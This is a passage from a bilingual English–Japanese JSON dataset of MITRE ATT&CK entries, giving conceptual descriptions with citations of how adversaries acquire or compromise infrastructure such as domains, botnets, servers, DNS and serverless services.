                        "description_jp": "攻撃者は、被害者にマルウェアを配布するために悪用できるオンライン広告を購入する可能性があります。広告は、検索エンジンの結果の目立つ場所など、オンラインの特定の場所にアーティファクトを植え付けたり、有利に配置したりするために購入できます。これらの広告により、ユーザーは実際の検索結果と広告を区別することが困難になる可能性があります。(引用: spamhaus-malvertising) 購入した広告はまた、広告ネットワークの機能を使用して特定のオーディエンスをターゲットにする可能性があり、検索エンジンや人気のあるWebサイトに本質的に与えられている信頼をさらに悪用する可能性があります。\n\n敵対者は、悪意のあるコードを含むアーティファクトを被害者に配布するのを助けるために、広告やその他のリソースを購入するかもしれない。購入された広告は、有名なブランドを偽装したり、なりすましたりしようとするかもしれない。例えば、これらの偽装された広告は、被害者を騙して広告をクリックさせ、その後、宣伝されているソフトウェアのトロイの木馬化されたバージョンを含む公式ウェブサイトのクローンである可能性のある悪意のあるドメインに送信するかもしれない。(引用：Masquerads-Guardio）（引用：FBI-search）敵対者の悪意のあるドメインの作成と広告の購入の努力もまた、クリーンアップの努力に抵抗するために大規模に自動化されるかもしれない。(引用：sentinelone-malvertising）\n\nマルバタイジングは、[ドライブバイターゲット](https://attack.mitre.org/techniques/T1608/004)および[ドライブバイコンプロマイズ](https://attack.mitre.org/techniques/T1189)をサポートするために使用される場合があり、広告にターゲットシステムのWebブラウザに感染するコード/エクスプロイトが含まれている場合、ユーザーからの限定的な対話が必要になる可能性があります。(引用: BBC-malvertising)\n\n敵対者はまた、広告ネットワークによる検出を回避するために、いくつかのテクニックを使用するかもしれない。例えば、敵対者は広告クリックを動的にルーティングして、自動化されたクローラー/ポリシーエンフォーサーのトラフィックを良性のサイトに送信し、潜在的なターゲットを検証した後、実際の広告クリックから参照された被害者を悪意のあるページに送信する。したがって、この感染経路は、広告ネットワークだけでなく、広告をクリックして有効な識別子で悪意のあるサイトに到達しない訪問者からも隠されたままになる可能性がある。(引用：Masquerads-Guardio）ブランド評価監視を避けるための意図的なタイプミスなど、他のトリックも自動検出を回避するために使用されるかもしれない。(引用：spamhaus-malvertising）"
                    },
                    {
                        "id": "T1583.001",
                        "name_eng": "Domains",
                        "name_jp": "ドメイン",
                        "description_eng": "Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.\n\nAdversaries may use acquired domains for a variety of purposes, including for [Phishing](https://attack.mitre.org/techniques/T1566), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), and Command and Control.(Citation: CISA MSS Sep 2020) Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD).(Citation: FireEye APT28)(Citation: PaypalScam) Typosquatting may be used to aid in delivery of payloads via [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute \"IDN homograph attacks,\" creating visually similar lookalike domains used to deliver malware to victim machines.(Citation: CISA IDN ST05-016)(Citation: tt_httrack_fake_domains)(Citation: tt_obliqueRAT)(Citation: httrack_unhcr)(Citation: lazgroup_idn_phishing)\n\nDifferent URIs/URLs may also be dynamically generated to uniquely serve malicious content to victims (including one-time, single use domain names).(Citation: iOS URL Scheme)(Citation: URI)(Citation: URI Use)(Citation: URI Unique)\n\nAdversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.(Citation: Categorisation_not_boundary)(Citation: Domain_Steal_CC)(Citation: Redirectors_Domain_Fronting)(Citation: bypass_webproxy_filtering)\n\nDomain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.(Citation: Mandiant APT1)\n\nIn addition to legitimately purchasing a domain, an adversary may register a new domain in a compromised environment. For example, in AWS environments, adversaries may leverage the Route53 domain service to register a domain and create hosted zones pointing to resources of the threat actor’s choosing.(Citation: Invictus IR DangerDev 2024)",
                        "description_jp": "攻撃者は、ターゲティング中に使用できるドメインを取得する可能性があります。ドメイン名は、1つ以上のIPアドレスを表すために使用される人間が読める名前です。ドメイン名は購入することも、場合によっては無料で取得することもできます。\n\n敵対者は取得したドメインを、[フィッシング](https://attack.mitre.org/techniques/T1566)、[ドライブバイコンプロマイズ](https://attack.mitre.org/techniques/T1189)、コマンドアンドコントロールなど、さまざまな目的で使用する可能性があります。(引用: CISA MSS Sep 2020) 敵対者は、ホモグラフの使用や異なるトップレベルドメイン（TLD）の使用など、正当なドメインに類似したドメインを選択する可能性があります。(引用: FireEye APT28)(引用: PaypalScam) タイポスクワッティングは、[ドライブバイコンプロマイズ](https://attack.mitre.org/techniques/T1189)を介したペイロードの配信を支援するために使用される可能性があります。敵対者はまた、国際化ドメイン名（IDN）や異なる文字セット（キリル文字、ギリシャ文字など）を使用して、「IDNホモグラフ攻撃」を実行し、視覚的に類似した偽のドメインを作成して被害者のマシンにマルウェアを配信する可能性があります。(引用: CISA IDN ST05-016)(引用: tt_httrack_fake_domains)(引用: tt_obliqueRAT)(引用: httrack_unhcr)(引用: lazgroup_idn_phishing)\n\nさまざまなURI/URLも、被害者に悪意のあるコンテンツを一意に提供するために動的に生成される場合があります（ワンタイム、シングルユースのドメイン名を含む）。(引用: iOS URL Scheme)(引用: URI)(引用: URI Use)(引用: URI Unique)\n\n敵対者はまた、既存の評判/履歴に基づいて防御側によって既に許可リスト/信頼されている可能性のある、期限切れのドメインを取得して再利用する可能性があります。(引用: Categorisation_not_boundary)(引用: Domain_Steal_CC)(引用: Redirectors_Domain_Fronting)(引用: bypass_webproxy_filtering)\n\nドメインレジストラはそれぞれ、登録されているすべてのドメインの連絡先情報を表示する公開データベースを管理しています。プライベートWHOISサービスは、ドメインの所有者ではなく、自社の会社データなどの代替情報を表示します。攻撃者は、そのようなプライベートWHOISサービスを使用して、購入したドメインの所有者に関する情報を難読化する可能性があります。攻撃者はまた、さまざまな登録情報を使用し、さまざまなドメインレジストラでドメインを購入することにより、インフラストラクチャの追跡の取り組みをさらに妨害する可能性があります。(引用: Mandiant APT1)\n\nドメインを正当に購入することに加えて、敵対者は侵害された環境で新しいドメインを登録する可能性があります。例えば、AWS環境では、敵対者はRoute53ドメインサービスを利用してドメインを登録し、脅威アクターが選択したリソースを指すホストゾーンを作成する可能性があります。(引用: Invictus IR DangerDev 2024)"
                    },
                    {
                        "id": "T1583.005",
                        "name_eng": "Botnet",
                        "name_jp": "ボットネット",
                        "description_eng": "Adversaries may buy, lease, or rent a network of compromised systems that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. \n\nInternet-facing edge devices and related network appliances that are end-of-life (EOL) and unsupported by their manufacturers are commonly acquired for botnet activities. Adversaries may lease operational relay box (ORB) networks – consisting of virtual private servers (VPS), small office/home office (SOHO) routers, or Internet of Things (IoT) devices – to serve as a botnet.(Citation: ORB Mandiant) \n\nWith a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).(Citation: Imperva DDoS for Hire)(Citation: Krebs-Anna)(Citation: Krebs-Bazaar)(Citation: Krebs-Booter) Acquired botnets may also be used to support Command and Control activity, such as [Hide Infrastructure](https://attack.mitre.org/techniques/T1665) through an established [Proxy](https://attack.mitre.org/techniques/T1090) network.",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる侵害されたシステムのネットワークを購入、リース、またはレンタルする可能性があります。ボットネットは、調整されたタスクを実行するように指示できる侵害されたシステムのネットワークです。(引用: Norton Botnet) 攻撃者は、ブーター/ストレッサーサービスから既存のボットネットを使用するためのサブスクリプションを購入する可能性があります。\n\nインターネットに接続されたエッジデバイスや関連するネットワークアプライアンスで、製造元によってサポートが終了 (EOL) され、サポートされていないものは、ボットネット活動のために一般的に取得されます。攻撃者は、仮想プライベートサーバー (VPS)、小規模オフィス/ホームオフィス (SOHO) ルーター、またはモノのインターネット (IoT) デバイスで構成される運用リレーボックス (ORB) ネットワークをリースして、ボットネットとして機能させることがあります。(引用: ORB Mandiant)\n\n自由に使えるボットネットがあれば、攻撃者は大規模な[フィッシング](https://attack.mitre.org/techniques/T1566)や分散型サービス拒否（DDoS）などの追跡活動を実行できます。(引用: Imperva DDoS for Hire)(引用: Krebs-Anna)(引用: Krebs-Bazaar)(引用: Krebs-Booter) 取得したボットネットは、確立された[プロキシ](https://attack.mitre.org/techniques/T1090)ネットワークを介した[インフラストラクチャの隠蔽](https://attack.mitre.org/techniques/T1665)など、コマンドアンドコントロール活動をサポートするためにも使用できます。"
                    },
                    {
                        "id": "T1583.004",
                        "name_eng": "Server",
                        "name_jp": "サーバー",
                        "description_eng": "Adversaries may buy, lease, rent, or obtain physical servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, such as watering hole operations in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), enabling [Phishing](https://attack.mitre.org/techniques/T1566) operations, or facilitating [Command and Control](https://attack.mitre.org/tactics/TA0011). Instead of compromising a third-party [Server](https://attack.mitre.org/techniques/T1584/004) or renting a [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may opt to configure and run their own servers in support of operations. Free trial periods of cloud servers may also be abused.(Citation: Free Trial PurpleUrchin)(Citation: Freejacked) \n\nAdversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.(Citation: NYTStuxnet)",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる物理サーバーを購入、リース、レンタル、または取得する可能性があります。サーバーの使用により、攻撃者は操作を準備、開始、および実行できます。侵害後のアクティビティ中、攻撃者は[ドライブバイコンプロマイズ](https://attack.mitre.org/techniques/T1189)でのウォータリングホール操作、[フィッシング](https://attack.mitre.org/techniques/T1566)操作の有効化、または[コマンドアンドコントロール](https://attack.mitre.org/tactics/TA0011)の促進など、さまざまなタスクにサーバーを利用する可能性があります。サードパーティの[サーバー](https://attack.mitre.org/techniques/T1584/004)を侵害したり、[仮想プライベートサーバー](https://attack.mitre.org/techniques/T1583/003)をレンタルしたりする代わりに、攻撃者は操作をサポートするために独自のサーバーを構成して実行することを選択する場合があります。クラウドサーバーの無料試用期間も悪用される可能性があります。(引用: Free Trial PurpleUrchin)(引用: Freejacked)\n\n敵対者は、ほとんどの活動がオンラインインフラストラクチャを使用して行われる場合、軽量なセットアップのみが必要になる場合があります。あるいは、独自のシステムで活動の他の側面をテスト、通信、制御したい場合は、広範なインフラストラクチャを構築する必要がある場合があります。(引用: NYTStuxnet)"
                    },
                    {
                        "id": "T1583.002",
                        "name_eng": "DNS Server",
                        "name_jp": "DNSサーバー",
                        "description_eng": "Adversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.\n\nBy running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic ([DNS](https://attack.mitre.org/techniques/T1071/004)). With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.(Citation: Unit42 DNS Mar 2019)",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる独自のドメインネームシステム（DNS）サーバーをセットアップする可能性があります。侵害後のアクティビティ中、攻撃者はコマンドアンドコントロール（例：[アプリケーション層プロトコル](https://attack.mitre.org/techniques/T1071)）など、さまざまなタスクにDNSトラフィックを利用する可能性があります。既存のDNSサーバーをハイジャックする代わりに、攻撃者は操作をサポートするために独自のDNSサーバーを構成して実行することを選択する場合があります。\n\n独自のDNSサーバーを実行することにより、攻撃者はサーバー側のDNS C2トラフィック（[DNS](https://attack.mitre.org/techniques/T1071/004)）をどのように管理するかをより詳細に制御できます。DNSサーバーを制御することで、攻撃者はDNSアプリケーションを構成してマルウェアに応答を条件付きで提供したり、一般的にDNSベースのC2チャネルの構造をより柔軟にしたりできます。(引用: Unit42 DNS Mar 2019)"
                    },
                    {
                        "id": "T1583.003",
                        "name_eng": "Virtual Private Server",
                        "name_jp": "仮想プライベートサーバー",
                        "description_eng": "Adversaries may rent Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.\n\nAcquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.(Citation: TrendmicroHideoutsLease)",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる仮想プライベートサーバー（VPS）をレンタルする可能性があります。仮想マシン/コンテナをサービスとして販売するさまざまなクラウドサービスプロバイダーが存在します。VPSを利用することにより、攻撃者は操作を物理的に追跡することを困難にすることができます。クラウドインフラストラクチャの使用はまた、攻撃者がインフラストラクチャを迅速にプロビジョニング、変更、およびシャットダウンすることを容易にする可能性があります。\n\n敵対者ライフサイクルの後の段階、例えばコマンドアンドコントロールなどで使用するためにVPSを取得すると、敵対者はより評判の高いクラウドサービスプロバイダーに関連する遍在性と信頼性の恩恵を受けることができる。敵対者はまた、最小限の登録情報でVPSを貸し出すことで知られるVPSサービスプロバイダーからインフラストラクチャを取得することもあり、これによりインフラストラクチャのより匿名性の高い取得が可能になる(引用：TrendmicroHideoutsLease)。"
                    },
                    {
                        "id": "T1583.007",
                        "name_eng": "Serverless",
                        "name_jp": "サーバーレス",
                        "description_eng": "Adversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers, AWS Lambda functions, or Google Apps Scripts, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.\n\nOnce acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090) traffic to an adversary-owned command and control server.(Citation: BlackWater Malware Cloudflare Workers)(Citation: AWS Lambda Redirector)(Citation: GWS Apps Script Abuse 2021) As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers - making it easier to [Hide Infrastructure](https://attack.mitre.org/techniques/T1665).(Citation: Detecting Command & Control in the Cloud)(Citation: BlackWater Malware Cloudflare Workers)",
                        "description_jp": "攻撃者は、Cloudflare Workers、AWS Lambda関数、Google Apps Scriptなどのサーバーレスクラウドインフラストラクチャを購入して構成し、ターゲティング中に使用する可能性があります。サーバーレスインフラストラクチャを利用することにより、攻撃者は操作中に使用されるインフラストラクチャを追跡することをより困難にすることができます。\n\n取得されると、サーバーレスランタイム環境は、感染したマシンに直接応答するか、攻撃者が所有するコマンドアンドコントロールサーバーにトラフィックを[プロキシ](https://attack.mitre.org/techniques/T1090)するために利用できます。(引用: BlackWater Malware Cloudflare Workers)(引用: AWS Lambda Redirector)(引用: GWS Apps Script Abuse 2021) これらの関数によって生成されるトラフィックは、一般的なクラウドプロバイダーのサブドメインから来ているように見えるため、これらのプロバイダーへの通常のトラフィックと区別することが困難な場合があり、[インフラストラクチャの隠蔽](https://attack.mitre.org/techniques/T1665)が容易になります。(引用: Detecting Command & Control in the Cloud)(引用: BlackWater Malware Cloudflare Workers)"
                    },
                    {
                        "id": "T1583.006",
                        "name_eng": "Web Services",
                        "name_jp": "Webサービス",
                        "description_eng": "Adversaries may register for web services that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)), [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567), or [Phishing](https://attack.mitre.org/techniques/T1566). Using common services, such as those offered by Google, GitHub, or Twitter, makes it easier for adversaries to hide in expected noise.(Citation: FireEye APT29)(Citation: Hacker News GitHub Abuse 2024) By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.",
                        "description_jp": "攻撃者は、ターゲティング中に使用できるWebサービスに登録する可能性があります。攻撃者が後の段階の攻撃者ライフサイクル中に悪用できるWebベースのサービスに登録するためのさまざまな人気のあるWebサイトが存在します。例えば、コマンドアンドコントロール中（[Webサービス](https://attack.mitre.org/techniques/T1102)）、[Webサービス経由のデータ持ち出し](https://attack.mitre.org/techniques/T1567)、または[フィッシング](https://attack.mitre.org/techniques/T1566)などです。Google、GitHub、Twitterなどが提供するような一般的なサービスを使用すると、攻撃者は予想されるノイズに紛れ込みやすくなります。(引用: FireEye APT29)(引用: Hacker News GitHub Abuse 2024) Webサービスを利用することにより、攻撃者は操作を物理的に追跡することを困難にすることができます。"
                    }
                ]
            },
            {
                "id": "T1584",
                "name_eng": "Compromise Infrastructure",
                "name_jp": "インフラストラクチャの侵害",
                "description_eng": "Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, network devices, and third-party web and DNS services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: ICANNDomainNameHijacking)(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye EPS Awakens Part 2) Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.\n\nUse of compromised infrastructure allows adversaries to stage, launch, and execute operations. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. For example, adversaries may leverage compromised infrastructure (potentially also in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) to further blend in and support staged information gathering and/or [Phishing](https://attack.mitre.org/techniques/T1566) campaigns.(Citation: FireEye DNS Hijack 2019) Adversaries may also compromise numerous machines to support [Proxy](https://attack.mitre.org/techniques/T1090) and/or proxyware services or to form a botnet.(Citation: amnesty_nso_pegasus)(Citation: Sysdig Proxyjacking) Additionally, adversaries may compromise infrastructure residing in close proximity to a target in order to gain [Initial Access](https://attack.mitre.org/tactics/TA0001) via [Wi-Fi Networks](https://attack.mitre.org/techniques/T1669).(Citation: Nearest Neighbor Volexity)\n\nBy using compromised infrastructure, adversaries may enable follow-on malicious operations. Prior to targeting, adversaries may also compromise the infrastructure of other adversaries.(Citation: NSA NCSC Turla OilRig)",
                "description_jp": "攻撃者は、ターゲティング中に使用できるサードパーティのインフラストラクチャを侵害する可能性があります。インフラストラクチャソリューションには、物理サーバーまたはクラウドサーバー、ドメイン、ネットワークデバイス、およびサードパーティのWebおよびDNSサービスが含まれます。インフラストラクチャを購入、リース、またはレンタルする代わりに、攻撃者はインフラストラクチャを侵害し、攻撃者ライフサイクルの他のフェーズ中にそれを使用する可能性があります。(引用: Mandiant APT1)(引用: ICANNDomainNameHijacking)(引用: Talos DNSpionage Nov 2018)(引用: FireEye EPS Awakens Part 2) さらに、攻撃者は多数のマシンを侵害して、活用できるボットネットを形成する可能性があります。\n\n侵害されたインフラストラクチャの使用により、攻撃者は操作を準備、開始、実行できます。侵害されたインフラストラクチャは、評判の高いサイトや信頼できるサイトとの接触など、通常と見なされるトラフィックと攻撃者の操作が混同されるのに役立つ場合があります。例えば、攻撃者は、侵害されたインフラストラクチャ（潜在的には[デジタル証明書](https://attack.mitre.org/techniques/T1588/004)と組み合わせて）を利用して、さらに混同し、段階的な情報収集や[フィッシング](https://attack.mitre.org/techniques/T1566)キャンペーンをサポートする可能性があります。(引用: FireEye DNS Hijack 2019) 攻撃者はまた、[プロキシ](https://attack.mitre.org/techniques/T1090)やプロキシウェアサービスをサポートしたり、ボットネットを形成したりするために多数のマシンを侵害する可能性もあります。(引用: amnesty_nso_pegasus)(引用: Sysdig Proxyjacking) さらに、攻撃者は、[Wi-Fiネットワーク](https://attack.mitre.org/techniques/T1669)を介して[初期アクセス](https://attack.mitre.org/tactics/TA0001)を取得するために、ターゲットの近くにあるインフラストラクチャを侵害する可能性があります。(引用: Nearest Neighbor Volexity)\n\n侵害されたインフラストラクチャを使用することにより、攻撃者はその後の悪意のある操作を有効にする可能性があります。ターゲティングの前に、攻撃者は他の攻撃者のインフラストラクチャも侵害する可能性があります。(引用: NSA NCSC Turla OilRig)",
                "subtechniques": [
                    {
                        "id": "T1584.003",
                        "name_eng": "Virtual Private Server",
                        "name_jp": "仮想プライベートサーバー",
                        "description_eng": "Adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.(Citation: NSA NCSC Turla OilRig)\n\nCompromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.",
                        "description_jp": "攻撃者は、ターゲティング中に使用できるサードパーティの仮想プライベートサーバー（VPS）を侵害する可能性があります。仮想マシン/コンテナをサービスとして販売するさまざまなクラウドサービスプロバイダーが存在します。攻撃者は、サードパーティエンティティによって購入されたVPSを侵害する可能性があります。インフラストラクチャとして使用するためにVPSを侵害することにより、攻撃者は操作を物理的に追跡することを困難にすることができます。(引用: NSA NCSC Turla OilRig)\n\n敵対者ライフサイクルの後の段階、例えばコマンドアンドコントロールなどで使用するためにVPSを侵害すると、敵対者はより評判の高いクラウドサービスプロバイダーに関連する遍在性と信頼性、および侵害されたサードパーティによって追加された信頼性の恩恵を受けることができる。"
                    },
                    {
                        "id": "T1584.002",
                        "name_eng": "DNS Server",
                        "name_jp": "DNSサーバー",
                        "description_eng": "Adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.\n\nBy compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye DNS Hijack 2019)  Additionally, adversaries may leverage such control in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004) to redirect traffic to adversary-controlled infrastructure, mimicking normal trusted network communications.(Citation: FireEye DNS Hijack 2019)(Citation: Crowdstrike DNS Hijack 2019) Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server.(Citation: CiscoAngler)(Citation: Proofpoint Domain Shadowing)",
                        "description_jp": "攻撃者は、ターゲティング中に使用できるサードパーティのDNSサーバーを侵害する可能性があります。侵害後のアクティビティ中、攻撃者はコマンドアンドコントロール（例：[アプリケーション層プロトコル](https://attack.mitre.org/techniques/T1071)）など、さまざまなタスクにDNSトラフィックを利用する可能性があります。独自のDNSサーバーをセットアップする代わりに、攻撃者は操作をサポートするためにサードパーティのDNSサーバーを侵害する可能性があります。\n\nDNSサーバーを侵害することにより、攻撃者はDNSレコードを変更できます。そのような制御により、組織のトラフィックのリダイレクトが可能になり、攻撃者の収集および資格情報アクセスの取り組みが容易になります。(引用: Talos DNSpionage Nov 2018)(引用: FireEye DNS Hijack 2019) さらに、攻撃者はそのような制御を[デジタル証明書](https://attack.mitre.org/techniques/T1588/004)と組み合わせて利用し、トラフィックを攻撃者が制御するインフラストラクチャにリダイレクトし、通常の信頼できるネットワーク通信を模倣する可能性があります。(引用: FireEye DNS Hijack 2019)(引用: Crowdstrike DNS Hijack 2019) 攻撃者はまた、DNSサーバーの実際の所有者に気付かれることなく、悪意のあるサーバーを指すサブドメインをサイレントに作成できる場合もあります。(引用: CiscoAngler)(引用: Proofpoint Domain Shadowing)"
                    },
                    {
                        "id": "T1584.006",
                        "name_eng": "Web Services",
                        "name_jp": "Webサービス",
                        "description_eng": "Adversaries may compromise access to third-party web services that can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, SendGrid, etc. Adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)), [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567), or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Recorded Future Turla Infra 2020) Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them. Additionally, leveraging compromised web-based email services may allow adversaries to leverage the trust associated with legitimate domains.",
                        "description_jp": "攻撃者は、ターゲティング中に使用できるサードパーティのWebサービスへのアクセスを侵害する可能性があります。GitHub、Twitter、Dropbox、Google、SendGridなど、正当なユーザーがWebベースのサービスに登録するためのさまざまな人気のあるWebサイトが存在します。攻撃者は、正当なユーザーのWebサービスへのアクセスを乗っ取り、そのWebサービスをサイバー操作をサポートするインフラストラクチャとして使用しようとする可能性があります。このようなWebサービスは、コマンドアンドコントロール中（[Webサービス](https://attack.mitre.org/techniques/T1102)）、[Webサービス経由のデータ持ち出し](https://attack.mitre.org/techniques/T1567)、または[フィッシング](https://attack.mitre.org/techniques/T1566)など、攻撃者ライフサイクルの後の段階で悪用される可能性があります。(引用: Recorded Future Turla Infra 2020) GoogleやTwitterなどが提供するような一般的なサービスを使用すると、攻撃者は予想されるノイズに紛れ込みやすくなります。Webサービスを利用することにより、特にアクセスが正当なユーザーから盗まれた場合、攻撃者は操作を物理的に追跡することを困難にすることができます。さらに、侵害されたWebベースの電子メールサービスを利用すると、攻撃者は正当なドメインに関連付けられた信頼を利用できる可能性があります。"
                    },
                    {
                        "id": "T1584.007",
                        "name_eng": "Serverless",
                        "name_jp": "サーバーレス",
                        "description_eng": "Adversaries may compromise serverless cloud infrastructure, such as Cloudflare Workers, AWS Lambda functions, or Google Apps Scripts, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them. \n\nOnce compromised, the serverless runtime environment can be leveraged to either respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090) traffic to an adversary-owned command and control server.(Citation: BlackWater Malware Cloudflare Workers)(Citation: AWS Lambda Redirector)(Citation: GWS Apps Script Abuse 2021) As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers - making it easier to [Hide Infrastructure](https://attack.mitre.org/techniques/T1665).(Citation: Detecting Command & Control in the Cloud)(Citation: BlackWater Malware Cloudflare Workers)",
                        "description_jp": "攻撃者は、Cloudflare Workers、AWS Lambda関数、Google Apps Scriptなどのサーバーレスクラウドインフラストラクチャを侵害し、ターゲティング中に使用する可能性があります。サーバーレスインフラストラクチャを利用することにより、攻撃者は操作中に使用されるインフラストラクチャを追跡することをより困難にすることができます。\n\n侵害されると、サーバーレスランタイム環境は、感染したマシンに直接応答するか、攻撃者が所有するコマンドアンドコントロールサーバーにトラフィックを[プロキシ](https://attack.mitre.org/techniques/T1090)するために利用できます。(引用: BlackWater Malware Cloudflare Workers)(引用: AWS Lambda Redirector)(引用: GWS Apps Script Abuse 2021) これらの関数によって生成されるトラフィックは、一般的なクラウドプロバイダーのサブドメインから来ているように見えるため、これらのプロバイダーへの通常のトラフィックと区別することが困難な場合があり、[インフラストラクチャの隠蔽](https://attack.mitre.org/techniques/T1665)が容易になります。(引用: Detecting Command & Control in the Cloud)(引用: BlackWater Malware Cloudflare Workers)"
                    },
                    {
                        "id": "T1584.005",
                        "name_eng": "Botnet",
                        "name_jp": "ボットネット",
                        "description_eng": "Adversaries may compromise numerous third-party systems to form a botnet that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Instead of purchasing/renting a botnet from a booter/stresser service, adversaries may build their own botnet by compromising numerous third-party systems.(Citation: Imperva DDoS for Hire) Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers.(Citation: Dell Dridex Oct 2015) With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できるボットネットを形成するために、多数のサードパーティシステムを侵害する可能性があります。ボットネットは、調整されたタスクを実行するように指示できる侵害されたシステムのネットワークです。(引用: Norton Botnet) ブーター/ストレッサーサービスからボットネットを購入/レンタルする代わりに、攻撃者は多数のサードパーティシステムを侵害することにより、独自のボットネットを構築する可能性があります。(引用: Imperva DDoS for Hire) 攻撃者はまた、ボットを攻撃者が制御するC2サーバーにリダイレクトするなど、既存のボットネットを乗っ取ることもあります。(引用: Dell Dridex Oct 2015) ボットネットを自由に使えるようになると、攻撃者は大規模な[フィッシング](https://attack.mitre.org/techniques/T1566)や分散型サービス拒否（DDoS）などの追跡活動を実行する可能性があります。"
                    },
                    {
                        "id": "T1584.004",
                        "name_eng": "Server",
                        "name_jp": "サーバー",
